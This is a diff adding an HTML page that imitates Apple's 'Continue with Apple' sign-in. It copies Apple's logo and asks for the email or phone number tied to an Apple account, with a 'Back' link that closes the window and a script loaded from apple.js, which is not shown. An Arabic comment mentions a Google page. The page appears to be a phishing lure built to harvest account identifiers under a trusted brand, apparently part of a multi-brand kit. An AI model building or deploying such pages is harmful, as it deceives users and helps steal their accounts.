@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Continue with Apple</title>
+    <style>
+      :root {
+        --bg: #0e1117;
+        --panel: #131922;
+        --line: rgba(255, 255, 255, 0.1);
+        --text: #f3f5f8;
+        --muted: #8d97a7;
+        --yellow: #f0b90b;
+        --danger: #f6465d;
+      }
+
+      * { box-sizing: border-box; }
+
+      html, body {
+        margin: 0;
+        min-height: 100%;
+        background: var(--bg);
+        color: var(--text);
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      body {
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px 16px;
+      }
+
+      .page {
+        width: min(100%, 460px);
+      }
+
+      .card {
+        background: rgba(18, 24, 32, 0.96);
+        border: 1px solid var(--line);
+        border-radius: 20px;
+        padding: 28px 22px 22px;
+        box-shadow: 0 20px 42px rgba(0, 0, 0, 0.28);
+      }
+
+      .brand {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 18px;
+      }
+
+      .brand svg {
+        width: 28px;
+        height: 28px;
+        color: #ffffff;
+      }
+
+      .title {
+        margin: 0 0 18px;
+        text-align: center;
+        font-size: 30px;
+        line-height: 1.2;
+        font-weight: 700;
+        letter-spacing: -0.04em;
+      }
+
+      .subtitle {
+        margin: 0 0 20px;
+        text-align: center;
+        color: var(--muted);
+        font-size: 16px;
+        line-height: 1.5;
+      }
+
+      .field {
+        margin-bottom: 18px;
+      }
+
+      .label {
+        display: block;
+        margin-bottom: 8px;
+        font-size: 14px;
+        color: var(--muted);
+      }
+
+      .input-shell {
+        border: 1px solid var(--line);
+        background: rgba(255,255,255,0.02);
+        border-radius: 12px;
+        transition: border-color 0.18s ease, box-shadow 0.18s ease;
+      }
+
+      .input-shell:focus-within {
+        border-color: rgba(240, 185, 11, 0.8);
+        box-shadow: 0 0 0 3px rgba(240, 185, 11, 0.12);
+      }
+
+      .input-shell.error {
+        border-color: rgba(246, 70, 93, 0.9);
+        box-shadow: 0 0 0 3px rgba(246, 70, 93, 0.08);
+      }
+
+      input {
+        width: 100%;
+        border: none;
+        outline: none;
+        background: transparent;
+        color: var(--text);
+        padding: 15px 16px;
+        font-size: 16px;
+      }
+
+      input::placeholder {
+        color: var(--muted);
+      }
+
+      .warning {
+        display: none;
+        margin-top: 8px;
+        color: var(--danger);
+        font-size: 13px;
+        line-height: 18px;
+      }
+
+      .warning.show {
+        display: block;
+      }
+
+      .login-btn {
+        width: 100%;
+        border: none;
+        border-radius: 12px;
+        background: var(--yellow);
+        color: #121212;
+        min-height: 48px;
+        font-weight: 700;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 8px;
+      }
+
+      .login-btn:hover {
+        filter: brightness(1.02);
+      }
+
+      .footer-note {
+        margin-top: 16px;
+        text-align: center;
+        color: var(--muted);
+        font-size: 13px;
+        line-height: 1.6;
+      }
+
+      .footer-note a {
+        color: var(--yellow);
+        text-decoration: none;
+      }
+
+      @media (max-width: 480px) {
+        .card {
+          padding: 22px 18px 18px;
+        }
+
+        .title {
+          font-size: 26px;
+        }
+
+        .subtitle {
+          font-size: 15px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="page">
+      <main class="card" aria-label="Apple login form">
+        <div class="brand" aria-label="Apple brand icon">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" aria-hidden="true">
+            <path fill-rule="evenodd" clip-rule="evenodd" d="M15.08 3.65c.11.96-.29 1.9-.87 2.59-.61.68-1.58 1.2-2.53 1.13-.12-.92.36-1.89.89-2.49.61-.68 1.66-1.19 2.51-1.23Zm3.03 5.14c-.11.06-1.86 1.05-1.84 3.08.02 2.45 2.26 3.26 2.29 3.27-.01.06-.34 1.17-1.18 2.3-.7 1-1.43 2-2.6 2.02-1.05.01-1.42-.27-2.41-.27-.99 0-1.42.27-2.32.27-1.11 0-1.95-.97-2.68-1.96C5.03 15.39 3.9 11.73 5.41 9.25c.73-1.22 2.07-2 3.5-2.03.6-.01 1.2.23 1.73.43.41.16.77.31 1.07.31.26 0 .61-.14 1.02-.3.64-.27 1.43-.56 2.24-.47.55.02 2.12.21 3.13 1.61l-.01.01Z"></path>
+          </svg>
+        </div>
+
+        <h1 class="title">Continue with Apple</h1>
+        <p class="subtitle">Please enter the email or phone number linked to your Apple account.</p>
+
+        <form id="appleForm" novalidate>
+          <div class="field">
+            <label class="label" for="appleIdentifier">Apple account email or phone</label>
+            <div class="input-shell" id="appleShell">
+              <input id="appleIdentifier" type="text" placeholder="name@icloud.com or your phone number" autocomplete="username" />
+            </div>
+            <div class="warning" id="appleWarning">Please enter a valid email or phone number.</div>
+          </div>
+
+          <button type="submit" class="login-btn">Continue</button>
+        </form>
+
+        <div class="footer-note">
+          <a href="javascript:window.close();">Back</a>
+        </div>
+      </main>
+    </div>
+
+    <!-- لصفحة جوجل -->
+<script type="module" src="apple.js"></script>
+  </body>
+</html>
